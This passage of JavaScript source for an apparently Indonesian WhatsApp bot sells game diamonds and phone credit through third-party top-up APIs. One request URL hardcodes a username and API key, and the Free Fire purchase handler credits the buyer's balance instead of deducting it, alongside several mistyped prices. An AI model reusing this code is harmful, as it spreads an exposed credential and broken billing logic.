_》${listmlbb.ml.ZIDMBL17.nama} : ${listmlbb.ml.ZIDMBL17.harga}_
_》${listmlbb.ml.ZIDMBL34.nama} : ${listmlbb.ml.ZIDMBL34.harga}_
_》${listmlbb.ml.ZIDMBL50.nama} : ${listmlbb.ml.ZIDMBL50.harga}_
_》${listmlbb.ml.ZIDMBL66.nama} : ${listmlbb.ml.ZIDMBL66.harga}_
_》${listmlbb.ml.ZIDMBL74.nama} : ${listmlbb.ml.ZIDMBL74.harga}_
_》${listmlbb.ml.ZIDMBL83.nama} : ${listmlbb.ml.ZIDMBL83.harga}_
_》${listmlbb.ml.ZIDMBL184.nama} : ${listmlbb.ml.ZIDMBL184.harga}_
_》${listmlbb.ml.ZIDMBL366.nama} : ${listmlbb.ml.ZIDMBL366.harga}_
_》${listmlbb.ml.ZIDMBL758.nama} : ${listmlbb.ml.ZIDMBL758.harga}_

Cara Pembelian:
${prefix}topupml2 ID|SERVER|JUMLAH DIAMOND
Contoh:
${prefix}topupml2 123456789|1450|85

NOTE: Pembelian Akan Diproses Oleh Sistem Otomatis Jika Saldo User Anda Terisi Dan Diamond Yang Anda Beli Akan Segera Masuk 3-5 Menit Proses.`
reply(lisya)
break

//WELCOME
case prefix+'welcome':{
          if (!isGroup) return reply(mess.group) 
          if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
          if (args.length < 1) return reply('on/off')
   		  if ((args[1]) === 'on') {
       	       if (isWelcome) return reply('Fitur Welcome sudah aktif sebelumnya!')
		               welcomeJson.push(from)
		               fs.writeFileSync('./FuncBot/group/welcome.json', JSON.stringify(welcomeJson))
			        reply('Sukses mengaktifkan Welcome di group:\n'+groupName)
			   } else if ((args[1]) === 'off') {
						welcomeJson.splice(from, 1)
						fs.writeFileSync('./FuncBot/group/welcome.json', JSON.stringify(welcomeJson))
		          	reply('Success menonaktifkan Welcome di group:\n'+groupName)
		       } else { reply('Kata kunci tidak ditentukan!') }
	      }
       break
case prefix+'buypulsa':
let dokid = text.split("|")[0]
let cusid = text.split("|")[1]
if (isNaN(parseInt(cusid))) return reply('Nomor Hp Harus Berupa Angka!')

let anuni = await fetchJson(`https://trendtoday.my.id/api/transaction?username=manik729828YWOD&apikey=lq7ae3b7j6n0wgrz5arcqdh0c5o7cx&product=pulsa&nominal=${dokid}&id_costumer=${cusid}`)
let suksess = `*─ 「 LANJUTKAN PEMBAYARAN 」 ─*
                
_Silahkan Scan Qris Dan Transfer Sesuai Harga:_
_》Harga : Rp${anuni.amount}_
_》Provider : ${anuni.provider}_
_》Nomor : ${cusid} ( Pulsa )_
_》Code Trx : ${anuni.transaction_id}_

_Qr Scan Berlaku 5 Menit, Setelah 5 Menit Pesan Ini Akan Dihapus!._  

_Note: Pulsa Akan Otomatis Masuk Setelah Pembayaran Berhasil._`
let inina = await Manik.sendMessage(m.chat, { image: { url: anuni.qr_payment }, caption: `${suksess}` }, { quoted: m })
setTimeout(() => {
Manik.sendMessage(from, { delete:inina.key })
}, 500000)
break
case prefix+'mls':{
if (!isManik) return reply('Fitur Topup Smile One Khusus Owner, Silahkan Melakukan Transaksi Dengan Owner!')
let prodc = text.split("|")[0]
let prodc2 = text.split("|")[1]
let prodcid = text.split("|")[2]
let prodcnya = `${prodc}${prodc2}`
let refer = randomNomor(001, 1000)
if (isNaN(parseInt(prodc))) return reply(`Id Harus Berupa Angka!\n\nContoh: ${prefix}mlsmile 23456789|2848|9288`)
if (isNaN(parseInt(prodcid))) return reply('Jumlah Harus Berupa Angka!')
let data = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${prodc}/${prodc2}?apikey=${lolkey}`)
let buttons = [{ buttonId: prefix+`mlsy ${prodc}|${prodc2}|${prodcid}`, buttonText: { displayText: 'Lanjutkan' }, type: 1 },]
if(`${data.status}` == 200) {
Manik.sendButtonText(m.chat, buttons, `*── 「 CHECK ID OTOMATIS 」 ──*

_Silahkan Cek Data Berikut Ini:_
_》Id Game : ${prodc} (${prodc2})_
_》NickName : ${data.result}_
_》Nama Item : ${prodcid} Diamond ( Mlbb )_

Jika Data Sudah Benar Silahkan Klik Lanjutkan Dan Jika Data Salah Silahkan Mengetik Ulang Transaksi Anda!.`, Manik.user.name, m)
} else if(`${data.status}` !== 200) {
reply('Invalid id/Error')
	}
break
}
case prefix+'mlsy':{
if (!isManik) return reply('Fitur Topup Smile One Khusus Owner, Silahkan Melakukan Transaksi Dengan Owner!')
let prodc = text.split("|")[0]
let prodc2 = text.split("|")[1]
let prodcid = text.split("|")[2]
let prodcnya = `${prodc}${prodc2}`
let refer = randomNomor(001, 1000)
const axios = require('axios')
if (isNaN(parseInt(prodc))) return reply('Id Harus Berupa Angka!')
if (isNaN(parseInt(prodcid))) return reply('Jumlah Harus Berupa Angka!')
var config = {
  method: 'get',
  url: `https://v1.apigames.id/transaksi/http-get-v1?merchant=${global.merchant}&secret=${global.secret}&produk=ML${prodcid}&tujuan=${prodcnya}&ref=${refer}`,
  headers: { }
};

axios(config)
.then(function (response) {
let workid = `*── 「 TOPUP SUKSES 」 ──*\n\n_》Harga : Rp${response.data.data.product_detail.price_rp}_\n_》NickName : ${response.data.data.sn}_\n_》Nama Item : ${prodcid} Diamond ( Mlbb )_\n_》Trx Id : ${response.data.data.trx_id}_\n\n_Item Akan Segera Masuk Secara Otomatis Silahkan Melakukan Pengecekan Secara Berkala Pada Game Anda._\n\nNote: Jika Ada Kesalahan Id Atau NickName Bukan Tanggung Jawab Owner!.`
let workd = `*── 「 TOPUP GAGAL 」 ──*

Transaksi Anda Gagal, Saldo Sistem Belum terisi, Harap Tunggu Saldo Sistem Reset Setiap 6 Jam Sekali!.`
if(response.data.data.status == "Sukses"){
	reply(workid)
} else if(response.data.data.status == "Gagal"){
reply(workd)
}
})
break
} 
case prefix+'mlsmile':
if (!isManik) return reply('Fitur Topup Smile One Khusus Owner, Silahkan Melakukan Transaksi Dengan Owner!')
let prodc = text.split("|")[0]
let prodc2 = text.split("|")[1]
let prodcid = text.split("|")[2]
let prodcnya = `${prodc}${prodc2}`
let refer = randomNomor(001, 1000)
if (isNaN(parseInt(prodc))) return reply(`Id Harus Berupa Angka!\n\nContoh: ${prefix}mlsmile 23456789|2848|9288`)
if (isNaN(parseInt(prodcid))) return reply('Jumlah Harus Berupa Angka!')
var axios = require('axios');
var config = {
  method: 'get',
  url: `https://v1.apigames.id/merchant/${global.merchant}/cek-username/mobilelegend?user_id=${prodcnya}&signature=${global.signature}`,
  headers: { }
};

axios(config)
.then(function (response) {
let buttons = [
{ buttonId: prefix+`mlsmiley ${prodc}|${prodc2}|${prodcid}`, buttonText: { displayText: 'Lanjutkan' }, type: 1 },
]
if (response.data.error_msg) {
reply('Invalid Id Or Zone')
}else if (response.data.message) {
Manik.sendButtonText(m.chat, buttons, `*── 「 CHECK ID OTOMATIS 」 ──*

_Silahkan Cek Data Berikut Ini:_
_》Id Game : ${prodc} (${prodc2})_
_》NickName : ${response.data.data.username}_
_》Nama Item : ${prodcid} Diamond ( Mlbb )_

Jika Data Sudah Benar Silahkan Klik Lanjutkan Dan Jika Data Salah Silahkan Mengetik Ulang Transaksi Anda!.`, Manik.user.name, m)
} 
})
.catch(function (error) {
  reply(error);
});
break
case prefix+'mlsmiley':{
if (!isManik) return reply('Fitur Topup Smile One Khusus Owner, Silahkan Melakukan Transaksi Dengan Owner!')
let prodc = text.split("|")[0]
let prodc2 = text.split("|")[1]
let prodcid = text.split("|")[2]
let prodcnya = `${prodc}${prodc2}`
let refer = randomNomor(001, 1000)
const axios = require('axios')
if (isNaN(parseInt(prodc))) return reply('Id Harus Berupa Angka!')
if (isNaN(parseInt(prodcid))) return reply('Jumlah Harus Berupa Angka!')
var config = {
  method: 'get',
  url: `https://v1.apigames.id/transaksi/http-get-v1?merchant=${global.merchant}&secret=${global.secret}&produk=ML${prodcid}&tujuan=${prodcnya}&ref=${refer}`,
  headers: { }
};

axios(config)
.then(function (response) {
let workid = `*── 「 TOPUP SUKSES 」 ──*\n\n_》Harga : Rp${response.data.data.product_detail.price_rp}_\n_》NickName : ${response.data.data.sn}_\n_》Nama Item : ${prodcid} Diamond ( Mlbb )_\n_》Trx Id : ${response.data.data.trx_id}_\n\n_Item Akan Segera Masuk Secara Otomatis Silahkan Melakukan Pengecekan Secara Berkala Pada Game Anda._\n\nNote: Jika Ada Kesalahan Id Atau NickName Bukan Tanggung Jawab Owner!.`
let workd = `*── 「 TOPUP GAGAL 」 ──*

Transaksi Anda Gagal, Saldo Sistem Belum terisi, Harap Tunggu Saldo Sistem Reset Setiap 6 Jam Sekali!.`
if(response.data.data.status == "Sukses"){
	reply(workid)
} else if(response.data.data.status == "Gagal"){
reply(workd)
}
})
break
}
case prefix+'mlsmileone':
let listsmile = `LIST DIAMOND MOBILE LEGEND SMILE ONE

Starlight Member Mobile Legend	
Rp0	
non-aktif

86 Diamond Mobile Legend	
Rp19.840	
aktif

172 Diamond Mobile Legend	
Rp39.370	
aktif

257 Diamond Mobile Legend	
Rp59.210	
aktif

344 Diamond Mobile Legend	
Rp78.740	
aktif

429 Diamond Mobile Legend	
Rp98.580	
aktif

514 Diamond Mobile Legend	
Rp118.420	
aktif

Twilight Pass Mobile Legend	
Rp131.440	
non-aktif

600 Diamond Mobile Legend	
Rp138.260	
aktif

706 Diamond Mobile Legend	
Rp158.100	
aktif

792 Diamond Mobile Legend	
Rp177.940	
aktif

878 Diamond Mobile Legend	
Rp197.470	
aktif

963 Diamond Mobile Legend	
Rp217.310	
aktif

1050 Diamond Mobile Legend	
Rp236.840	
aktif

1220 Diamond Mobile Legend	
Rp276.520	
aktif

Member Starlight Plus	
Rp299.150	
non-aktif

1412 Diamond Mobile Legend	
Rp316.200	
aktif

2195 Diamond Mobile Legend	
Rp474.920	
aktif

2901 Diamond Mobile Legend	
Rp633.020	
aktif

3073 Diamond Mobile Legend	
Rp672.390	
aktif

3688 Diamond Mobile Legend	
Rp792.360	
aktif

4394 Diamond Mobile Legend	
Rp950.460	
aktif

5532 Diamond Mobile Legend	
Rp1.189.160	
aktif

6238 Diamond Mobile Legend	
Rp1.347.260	
aktif

7727 Diamond Mobile Legend	
Rp1.664.080	
aktif

9288 Diamond Mobile Legend	
Rp1.977.800	
aktif`
reply(listsmile)
break
case prefix+'topupff':{
if (isGroup) return reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idff = text.split("|")[0]
let produkid = text.split("|")[1]
if (isNaN(parseInt(idff))) return reply('Id Harus Berupa Angka!')
if (isNaN(parseInt(produkid))) return reply('Jumlah Harus Berupa Angka!')
let idharga = `FF${produkid}`
if (idharga == "FF5"){
global.hargadmff = 900
}
if (idharga == "FF10"){
global.hargadmff = 1800
}
if (idharga == "FF15"){
global.hargadmff = 2700
}
if (idharga == "FF20"){
global.hargadmff = 3000
}
if (idharga == "FF25"){
global.hargadmff = 3900
}
if (idharga == "FF30"){
global.hargadmff = 4800
}
if (idharga == "FF40"){
global.hargadmff = 6000
}
if (idharga == "FF50"){
global.hargadmff = 7200
}
if (idharga == "FF55"){
global.hargadmff = 8100
}
if (idharga == "FF60"){
global.hargadmff = 9000
}
if (idharga == "FF70"){
global.hargadmff = 9900
}
if (idharga == "FF75"){
global.hargadmff = 10800
}
if (idharga == "FF80"){	
global.hargadmff =11700
}
if (idharga == "FF90"){	
global.hargadmff =12900
}
if (idharga == "FF95"){	
global.hargadmff =13800
}	
if (idharga == "FF100"){	
global.hargadmff = 14400
}
if (idharga == "FF120"){	
global.hargadmff =17100
}
if (idharga == "FF130"){	
global.hargadmff =18900
}
if (idharga == "FF140"){	
global.hargadmff =19800
}	
if (idharga == "FF145"){	
global.hargadmff =20700
}
if (idharga == "FF150"){	
global.hargadmff =21600
}
if (idharga == "FF160"){	
global.hargadmff =22800
}
if (idharga == "FF180"){	
global.hargadmff =25800
}
if (idharga == "FF190"){	
global.hargadmff =27000
}
if (idharga == "FF200"){	
global.hargadmff =28800
}
if (idharga == "FF210"){	
global.hargadmff =29700
}
if (idharga == "FFM"){
global.hargadmff =30000
}
if (idharga == "FF250"){	
global.hargadmff =35700
}
if (idharga == "FF280"){	
global.hargadmff =39600
}
if (idharga == "FF300"){	
global.hargadmff =42600
}
if (idharga == "FF355"){	
global.hargadmff =49900
}
if (idharga == "FF350"){	
global.hargadmff =49500
}
if (idharga == "FF375"){	
global.hargadmff =52500
}
if (idharga == "FF400"){	
global.hargadmff =56400
}
if (idharga == "FF405"){	
global.hargadmff =56700
}
if (idharga == "FF425"){	
global.hargadmff =59400
}
if (idharga == "FF475"){	
global.hargadmff =66600
}
if (idharga == "FF500"){	
global.hargadmff =70200
}
if (idharga == "FF510"){	
global.hargadmff = 72000
}
if (idharga == "FF515"){	
global.hargadmff = 72300
}

if (idharga == "FF512"){
global.hargadmff =72300
}
if (idharga == "FF545"){	
global.hargadmff =76500
}
if (idharga == "FF565"){	
global.hargadmff =79200
}	
if (idharga == "FF600"){	
global.hargadmff =84600
}
if (idharga == "FF635"){	
global.hargadmff = 89100
}
if (idharga == "FF645"){	
global.hargadmff =90900
}
if (idharga == "FF655"){	
global.hargadmff =92100
}
if (idharga == "FF720"){	
global.hargadmff = 99000
}
if (idharga == "FF700"){	
global.hargadmff =99000
}
if (idharga == "FF770"){	
global.hargadmff =106200
}	
if (idharga == "FF790"){	
global.hargadmff = 108900
}
if (idharga == "FF800"){	
global.hargadmff = 110700
}
if (idharga == "FF860"){	
global.hargadmff = 118800
}
if (idharga == "FF930"){	
global.hargadmff =128700
}
if (idharga == "FF1000"){	
global.hargadmff =138600
}	
if (idharga == "FF1050"){	
global.hargadmff =145800
}
if (idharga == "FF1075"){	
global.hargadmff =148500
}
if (idharga == "FF1080"){	
global.hargadmff =149400
}
if (idharga == "FFB"){
global.hargadmff =150000
}
if (idharga == "FF1200"){	
global.hargadmff =166800
}
if (idharga == "FF1215"){	
global.hargadmff =16830
}
if (idharga == "FF1300"){	
global.hargadmff =180900
}
if (idharga == "FF1440"){	
global.hargadmff =198000
}
if (idharga == "FF1450"){	
global.hargadmff =199800
}
if (idharga == "FF1490"){	
global.hargadmff =205200
}
if (idharga == "FF1510"){	
global.hargadmff =207900
}
if (idharga == "FF1580"){	
global.hargadmff =217800
}
if (idharga == "FF1795"){	
global.hargadmff =247500
}
if (idharga == "FF1800"){	
global.hargadmff = 248400
}
if (idharga == "FF2000"){	
global.hargadmff =270000
}
if (idharga == "FF2140"){	
global.hargadmff = 289800
}
if (idharga == "FF2190"){	
global.hargadmff = 297000
}
if (idharga == "FF2210"){	
global.hargadmff = 299700
}
if (idharga == "FF2280"){	
global.hargadmff = 309600
}
if (idharga == "FF2355"){	
global.hargadmff = 319500
}
if (idharga == "FF2720"){	
global.hargadmff = 369000
}
if (idharga == "FF4000"){
global.hargadmff = 540000
}
if (idharga == "FF77290"){
global.hargadmff = 990000
}
if (getMonUser(sender) < global.hargadmff) {
 reply('Saldo User Anda Kurang!. Silahkan Melakukan Deposit Terlebih Dahulu')
 } else if(getMonUser(sender) > global.hargadmff) {
var axios = require('axios');

var config = {
  method: 'get',
  url: `https://v1.apigames.id/merchant/${global.merchant}/cek-username/freefire?user_id=${idff}&signature=${global.signature}`,
  headers: { }
};

axios(config)
.then(function (response) {
let buttons = [
{ buttonId: prefix+`topupffyes ${idff}|${produkid}`, buttonText: { displayText: 'Lanjutkan' }, type: 1 },
]
if (response.data.error_msg) {
reply('Invalid Id')
} else if(response.data.message) {
Manik.sendButtonText(m.chat, buttons, `*── 「 CHECK ID OTOMATIS 」 ──*
                
_Silahkan Cek Data Berikut Ini:_
_》Id Game : ${idff}_
_》NickName : ${response.data.data.username}_
_》Nama Item : ${produkid} Diamond ( FreeFire )_

Jika Data Sudah Benar Silahkan Klik Lanjutkan Dan Jika Data Salah Silahkan Mengetik Ulang Transaksi Anda!.`, Manik.user.name, m)
} 
})
.catch(function (error) {
  console.log(error);
});
}
break
}
case prefix+'topupffyes':{
if (isGroup) return reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idff = text.split("|")[0]
let produkid = text.split("|")[1]
let refdi = randomNomor(001, 1000)
let refid = `${refdi}`
let idharga = `FF${produkid}`
var axios = require('axios');
var config = {
  method: 'get',
  url: `https://v1.apigames.id/transaksi/http-get-v1?merchant=${global.merchant}&secret=${global.secret}&produk=FF${produkid}&tujuan=${idff}&ref=TRX${refid}`,
  headers: { }
};

axios(config)
.then(function (response) {
let idharga = `FF${produkid}`
if (idharga == "FF5"){
global.hargadmff = 900
}
if (idharga == "FF10"){
global.hargadmff = 1800
}
if (idharga == "FF15"){
global.hargadmff = 2700
}
if (idharga == "FF20"){
global.hargadmff = 3000
}
if (idharga == "FF25"){
global.hargadmff = 3900
}
if (idharga == "FF30"){
global.hargadmff = 4800
}
if (idharga == "FF40"){
global.hargadmff = 6000
}
if (idharga == "FF50"){
global.hargadmff = 7200
}
if (idharga == "FF55"){
global.hargadmff = 8100
}
if (idharga == "FF60"){
global.hargadmff = 9000
}
if (idharga == "FF70"){
global.hargadmff = 9900
}
if (idharga == "FF75"){
global.hargadmff = 10800
}
if (idharga == "FF80"){	
global.hargadmff =11700
}
if (idharga == "FF90"){	
global.hargadmff =12900
}
if (idharga == "FF95"){	
global.hargadmff =13800
}	
if (idharga == "FF100"){	
global.hargadmff = 14400
}
if (idharga == "FF120"){	
global.hargadmff =17100
}
if (idharga == "FF130"){	
global.hargadmff =18900
}
if (idharga == "FF140"){	
global.hargadmff =19800
}	
if (idharga == "FF145"){	
global.hargadmff =20700
}
if (idharga == "FF150"){	
global.hargadmff =21600
}
if (idharga == "FF160"){	
global.hargadmff =22800
}
if (idharga == "FF180"){	
global.hargadmff =25800
}
if (idharga == "FF190"){	
global.hargadmff =27000
}
if (idharga == "FF200"){	
global.hargadmff =28800
}
if (idharga == "FF210"){	
global.hargadmff =29700
}
if (idharga == "FFM"){
global.hargadmff =30000
}
if (idharga == "FF250"){	
global.hargadmff =35700
}
if (idharga == "FF280"){	
global.hargadmff =39600
}
if (idharga == "FF300"){	
global.hargadmff =42600
}
if (idharga == "FF355"){	
global.hargadmff =49900
}
if (idharga == "FF350"){	
global.hargadmff =49500
}
if (idharga == "FF375"){	
global.hargadmff =52500
}
if (idharga == "FF400"){	
global.hargadmff =56400
}
if (idharga == "FF405"){	
global.hargadmff =56700
}
if (idharga == "FF425"){	
global.hargadmff =59400
}
if (idharga == "FF475"){	
global.hargadmff =66600
}
if (idharga == "FF500"){	
global.hargadmff =70200
}
if (idharga == "FF510"){	
global.hargadmff = 72000
}
if (idharga == "FF515"){	
global.hargadmff = 72300
}

if (idharga == "FF512"){
global.hargadmff =72300
}
if (idharga == "FF545"){	
global.hargadmff =76500
}
if (idharga == "FF565"){	
global.hargadmff =79200
}	
if (idharga == "FF600"){	
global.hargadmff =84600
}
if (idharga == "FF635"){	
global.hargadmff = 89100
}
if (idharga == "FF645"){	
global.hargadmff =90900
}
if (idharga == "FF655"){	
global.hargadmff =92100
}
if (idharga == "FF720"){	
global.hargadmff = 99000
}
if (idharga == "FF700"){	
global.hargadmff =99000
}
if (idharga == "FF770"){	
global.hargadmff =106200
}	
if (idharga == "FF790"){	
global.hargadmff = 108900
}
if (idharga == "FF800"){	
global.hargadmff = 110700
}
if (idharga == "FF860"){	
global.hargadmff = 118800
}
if (idharga == "FF930"){	
global.hargadmff =128700
}
if (idharga == "FF1000"){	
global.hargadmff =138600
}	
if (idharga == "FF1050"){	
global.hargadmff =145800
}
if (idharga == "FF1075"){	
global.hargadmff =148500
}
if (idharga == "FF1080"){	
global.hargadmff =149400
}
if (idharga == "FFB"){
global.hargadmff =150000
}
if (idharga == "FF1200"){	
global.hargadmff =166800
}
if (idharga == "FF1215"){	
global.hargadmff =16830
}
if (idharga == "FF1300"){	
global.hargadmff =180900
}
if (idharga == "FF1440"){	
global.hargadmff =198000
}
if (idharga == "FF1450"){	
global.hargadmff =199800
}
if (idharga == "FF1490"){	
global.hargadmff =205200
}
if (idharga == "FF1510"){	
global.hargadmff =207900
}
if (idharga == "FF1580"){	
global.hargadmff =217800
}
if (idharga == "FF1795"){	
global.hargadmff =247500
}
if (idharga == "FF1800"){	
global.hargadmff = 248400
}
if (idharga == "FF2000"){	
global.hargadmff =270000
}
if (idharga == "FF2140"){	
global.hargadmff = 289800
}
if (idharga == "FF2190"){	
global.hargadmff = 297000
}
if (idharga == "FF2210"){	
global.hargadmff = 299700
}
if (idharga == "FF2280"){	
global.hargadmff = 309600
}
if (idharga == "FF2355"){	
global.hargadmff = 319500
}
if (idharga == "FF2720"){	
global.hargadmff = 369000
}
if (idharga == "FF4000"){
global.hargadmff = 540000
}
if (idharga == "FF77290"){
global.hargadmff = 990000
}
let workid = `*── 「 TOPUP SUKSES 」 ──*\n\n_》Harga : Rp${global.hargadmff}_\n_》NickName : ${response.data.data.sn}_\n_》Nama Item : ${produkid} Diamond ( FreeFire )_\n_》Trx Id : ${response.data.data.trx_id}_\n\n_Item Akan Segera Masuk Secara Otomatis Silahkan Melakukan Pengecekan Secara Berkala Pada Game Anda.\n\nNote: Jika Ada Kesalahan Id Atau NickName Bukan Tanggung Jawab Owner!.`
let workd = `*── 「 TOPUP GAGAL 」 ──*

Transaksi Anda Gagal, Saldo Sistem Belum terisi Saldo User Anda Tidak Akan Dipotong, Harap Tumggu Saldo Sistem Reset Setiap 6 Jam Sekali!.`
if(response.data.data.status == "Sukses"){
if (idharga == "FF5"){
moneyAdd(m.sender, 900)
reply(workid)
}
if (idharga == "FF10"){
moneyAdd(m.sender, 1800)
reply(workid)
}
if (idharga == "FF15"){
moneyAdd(m.sender, 2700)
reply(workid)
}
if (idharga == "FF20"){
moneyAdd(m.sender, 3000)
reply(workid)
}
if (idharga == "FF25"){
moneyAdd(m.sender, 3900)
reply(workid)
}
if (idharga == "FF30"){
moneyAdd(m.sender, 4800)
reply(workid)
}
if (idharga == "FF40"){
moneyAdd(m.sender, 6000)
reply(workid)
}
if (idharga == "FF50"){
moneyAdd(m.sender, 7200)
reply(workid)
}
if (idharga == "FF55"){
moneyAdd(m.sender, 8100)
reply(workid)
}
if (idharga == "FF60"){
moneyAdd(m.sender, 9000)
reply(workid)
}
if (idharga == "FF70"){
moneyAdd(m.sender, 9900)
reply(workid)
}
if (idharga == "FF75"){
moneyAdd(m.sender, 10800)
reply(workid)
}
if (idharga == "FF80"){	
moneyAdd(m.sender,11700)
reply(workid)
}
if (idharga == "FF90"){	
moneyAdd(m.sender,12900)
reply(workid)
}
if (idharga == "FF95"){	
moneyAdd(m.sender,13800)
reply(workid)
}	
if (idharga == "FF100"){	
moneyAdd(m.sender, 14400)
reply(workid)
}
if (idharga == "FF120"){	
moneyAdd(m.sender,17100)
reply(workid)
}
if (idharga == "FF130"){	
moneyAdd(m.sender,18900)
reply(workid)
}
if (idharga == "FF140"){	
moneyAdd(m.sender,19800)
reply(workid)
}	
if (idharga == "FF145"){	
moneyAdd(m.sender,20700)
reply(workid)
}
if (idharga == "FF150"){	
moneyAdd(m.sender,21600)
reply(workid)
}
if (idharga == "FF160"){	
moneyAdd(m.sender,22800)
reply(workid)
}
if (idharga == "FF180"){	
moneyAdd(m.sender,25800)
reply(workid)
}
if (idharga == "FF190"){	
moneyAdd(m.sender,27000)
reply(workid)
}
if (idharga == "FF200"){	
moneyAdd(m.sender,28800)
reply(workid)
}
if (idharga == "FF210"){	
moneyAdd(m.sender,29700)
reply(workid)
}
if (idharga == "FFM"){
moneyAdd(m.sender,30000)
reply(workid)
}
if (idharga == "FF250"){	
moneyAdd(m.sender,35700)
reply(workid)
}
if (idharga == "FF280"){	
moneyAdd(m.sender,39600)
reply(workid)
}
if (idharga == "FF300"){	
moneyAdd(m.sender,42600)
reply(workid)
}
if (idharga == "FF355"){	
moneyAdd(m.sender,49900)
reply(workid)
}
if (idharga == "FF350"){	
moneyAdd(m.sender,49500)
reply(workid)
}
if (idharga == "FF375"){	
moneyAdd(m.sender,52500)
reply(workid)
}
if (idharga == "FF400"){	
moneyAdd(m.sender,56400)
reply(workid)
}
if (idharga == "FF405"){	
moneyAdd(m.sender,56700)
reply(workid)
}
if (idharga == "FF425"){	
moneyAdd(m.sender,59400)
reply(workid)
}
if (idharga == "FF475"){	
moneyAdd(m.sender,66600)
reply(workid)
}
if (idharga == "FF500"){	
moneyAdd(m.sender,70200)
reply(workid)
}
if (idharga == "FF510"){	
moneyAdd(m.sender, 72000)
reply(workid)
}
if (idharga == "FF515"){	
moneyAdd(m.sender, 72300)
reply(workid)
}

if (idharga == "FF512"){
moneyAdd(m.sender,72300)
reply(workid)
}
if (idharga == "FF545"){	
moneyAdd(m.sender,76500)
reply(workid)
}
if (idharga == "FF565"){	
moneyAdd(m.sender,79200)
reply(workid)
}	
if (idharga == "FF600"){	
moneyAdd(m.sender,84600)
reply(workid)
}
if (idharga == "FF635"){	
moneyAdd(m.sender, 89100)
reply(workid)
}
if (idharga == "FF645"){	
moneyAdd(m.sender,90900)
reply(workid)
}
if (idharga == "FF655"){	
moneyAdd(m.sender,92100)
reply(workid)
}
if (idharga == "FF720"){	
moneyAdd(m.sender, 99000)
reply(workid)
}
if (idharga == "FF700"){	
moneyAdd(m.sender,99000)
reply(workid)
}
if (idharga == "FF770"){	
moneyAdd(m.sender,106200)
reply(workid)
}	
if (idharga == "FF790"){	
moneyAdd(m.sender, 108900)
reply(workid)
}
if (idharga == "FF800"){	
moneyAdd(m.sender, 110700)
reply(workid)
}
if (idharga == "FF860"){	
moneyAdd(m.sender, 118800)
reply(workid)
}
if (idharga == "FF930"){	
moneyAdd(m.sender,128700)
reply(workid)
}
if (idharga == "FF1000"){	
moneyAdd(m.sender,138600)
reply(workid)
}	
if (idharga == "FF1050"){	
moneyAdd(m.sender,145800)
reply(workid)
}
if (idharga == "FF1075"){	
moneyAdd(m.sender,148500)
reply(workid)
}
if (idharga == "FF1080"){	
moneyAdd(m.sender,149400)
reply(workid)
}
if (idharga == "FFB"){
moneyAdd(m.sender,150000)
reply(workid)
}
if (idharga == "FF1200"){	
moneyAdd(m.sender,166800)
reply(workid)
}
if (idharga == "FF1215"){	
moneyAdd(m.sender,16830)
reply(workid)
}
if (idharga == "FF1300"){	
moneyAdd(m.sender,180900)
reply(workid)
}
if (idharga == "FF1440"){	
moneyAdd(m.sender,198000)
reply(workid)
}
if (idharga == "FF1450"){	
moneyAdd(m.sender,199800)
reply(workid)
}
if (idharga == "FF1490"){	
moneyAdd(m.sender,205200)
reply(workid)
}
if (idharga == "FF1510"){	
moneyAdd(m.sender,207900)
reply(workid)
}
if (idharga == "FF1580"){	
moneyAdd(m.sender,217800)
reply(workid)
}
if (idharga == "FF1795"){	
moneyAdd(m.sender,247500)
reply(workid)
}
if (idharga == "FF1800"){	
moneyAdd(m.sender, 248400)
reply(workid)
}
if (idharga == "FF2000"){	
moneyAdd(m.sender,270000)
reply(workid)
}
if (idharga == "FF2140"){	
moneyAdd(m.sender, 289800)
reply(workid)
}
if (idharga == "FF2190"){	
moneyAdd(m.sender, 297000)
reply(workid)
}
if (idharga == "FF2210"){	
moneyAdd(m.sender, 299700)
reply(workid)
}
if (idharga == "FF2280"){	
moneyAdd(m.sender, 309600)
reply(workid)
}
if (idharga == "FF2355"){	
moneyAdd(m.sender, 319500)
reply(workid)
}
if (idharga == "FF2720"){	
moneyAdd(m.sender, 369000)
reply(workid)
}
if (idharga == "FF4000"){
moneyAdd(m.sender, 540000)
reply(workid)
}
if (idharga == "FF77290"){
moneyAdd(m.sender, 990000)
reply(workid)
}
} else if(response.data.data.status == "Gagal"){
reply(workd)
}
})
break
}


case prefix+'topupml':{
if (isGroup) return reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idml1 = text.split("|")[0]
let idml2 = text.split("|")[1]
let idml = `${idml1}${idml2}`
let produkid = text.split("|")[2]
if (isNaN(parseInt(produkid))) return reply('Jumlah Harus Berupa Angka!')
if (isNaN(parseInt(idml1))) return reply('Id Harus Berupa Angka!')
if (isNaN(parseInt(idml2))) return reply('Server Harus Berupa Angka!')
let idharga = `UPMBL${produkid}`
if (idharga == "UPMBL5"){
global.hargadmml = 1700
}
if (idharga == "UPMBL12"){
global.hargadmml = 4000
}
if (idharga == "ZIDMBL17"){
global.hargadmml = 4500
}
if (idharga == "UPMBL19"){
global.hargadmml = 7000
}
if (idharga == "UPMBL28"){
global.hargadmml = 13000
}
if (idharga == "UPMBL36"){
global.hargadmml = 21000
}
if (idharga == "UPMBL44"){
global.hargadmml = 15000
}
if (idharga == "UPMBL59"){
global.hargadmml = 18500
    }
if (idharga == "UPMBL74"){
global.hargadmml = 22500
    }
if (idharga == "UPMBL85"){
global.hargadmml = 26500
    }
if (idharga == "UPMBL170"){
global.hargadmml = 51500
    }
if (idharga == "UPMBL185"){
global.hargadmml = 56500
    }
if (idharga == "UPMBL222"){
global.hargadmml = 67500
    }
if (idharga == "UPMBL240"){
global.hargadmml = 72500
    }
if (idharga == "UPMBL296"){
global.hargadmml = 89500
    }
if (idharga == "UPMBL370"){
global.hargadmml = 111500
    }
if (idharga == "UPMBL408"){
global.hargadmml = 123500
    }
if (idharga == "UPMBL568"){
global.hargadmml = 167500
    }
if (idharga == "UPMBL875"){
global.hargadmml = 256500
    }
if (idharga == "UPMBL1159"){
global.hargadmml = 333500
    }
if (idharga == "UPMBL2010"){
global.hargadmml = 555.500
    }
if (idharga == "UPMBL4830"){
global.hargadmml = 1322500
    }
    
if (getMonUser(sender) < global.hargadmml) {
 reply('Saldo User Anda Kurang!. Silahkan Melakukan Deposit Terlebih Dahulu')
 } else if(getMonUser(sender) > global.hargadmml) {
var axios = require('axios');
var config = {
  method: 'get',
